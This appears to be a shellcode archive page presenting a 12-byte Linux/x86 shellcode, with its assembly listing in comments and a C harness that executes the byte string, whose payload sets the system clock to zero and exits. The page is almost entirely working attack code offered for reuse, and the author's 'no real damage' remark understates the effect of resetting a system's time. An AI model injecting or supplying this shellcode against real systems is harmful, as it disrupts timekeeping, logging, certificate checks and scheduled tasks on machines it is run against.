<html><head><title>Linux/x86 - set system time to 0 &amp; exit</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* By Kris Katterjohn 11/18/2006
 *
 * 12 byte shellcode to set system time to 0 and exit. No real damage :)
 *
 * exit() code is the last 5 bytes (0x6a - 0x80)
 *
 * for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; stime([0])
 *
 *      push byte 25
 *      pop eax
 *      cdq
 *      push edx
 *      mov ebx, esp
 *      int 0x80
 *
 * ; exit()
 *
 *      inc eax
 *      int 0x80
 */

main()
{
       char shellcode[] = &quot;\x6a\x19\x58\x99\x52\x89\xe3\xcd\x80\x40\xcd\x80&quot;;

       (*(void (*)()) shellcode)();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
